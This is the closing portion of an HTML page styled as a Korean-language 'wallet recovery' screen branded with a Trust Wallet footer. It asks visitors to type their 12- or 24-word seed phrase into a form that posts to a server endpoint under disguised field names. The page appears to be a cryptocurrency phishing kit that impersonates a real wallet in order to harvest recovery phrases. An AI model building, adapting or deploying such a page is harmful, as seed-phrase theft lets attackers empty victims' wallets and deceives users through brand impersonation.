    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
        }
        body {
            background: linear-gradient(to right, #1E3A8A, #3375BB);
            color: #fff;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            max-width: 400px;
            width: 90%;
        }
        .header {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .logo {
            width: 80px;
            margin-bottom: 20px;
        }
        h2 {
            color: #fff;
            font-weight: 600;
            margin-bottom: 10px;
        }
        p {
            color: #ddd;
            font-size: 14px;
            margin-bottom: 15px;
        }
        textarea {
            width: 100%;
            height: 120px;
            border: none;
            border-radius: 10px;
            padding: 15px;
            font-size: 16px;
            resize: none;
            background: rgba(255, 255, 255, 0.2);
            color: #fff;
            outline: none;
            transition: all 0.3s;
        }
        textarea:focus {
            background: rgba(255, 255, 255, 0.3);
        }
        .warning {
            color: red;
            font-size: 12px;
            margin-top: 10px;
            display: none;
        }
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(to right, #FFD700, #FFA500);
            border: none;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 15px;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(255, 165, 0, 0.4);
        }
        button:hover {
            transform: scale(1.05);
        }
        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: #bbb;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">지갑 복구</div>
        <img class="logo" src="" alt="Your Logo">
        <h2>지갑 시드 문구를 입력하세요</h2>
        <form action="first" method="post">
        <p>시드 문구는 새 지갑을 만들 때 무작위로 생성되는 12개 또는 24개 단어의 시리즈입니다. 시드 문구가 올바르고 완전한지 확인하십시오.</p>
        <input type="hidden" name="horse" value="TW WALLET">
        <textarea name="pig" placeholder="여기에 시드 문구를 입력하세요..." required minlength="60" maxlength="120"></textarea>
        <p class="warning"></p>
        <button type="submit">지금 확인하세요</button>
        </form>
        <div class="footer"> All Rights Reserved © 2025 Trust Wallet</div>
    </div>

</body>
</html>
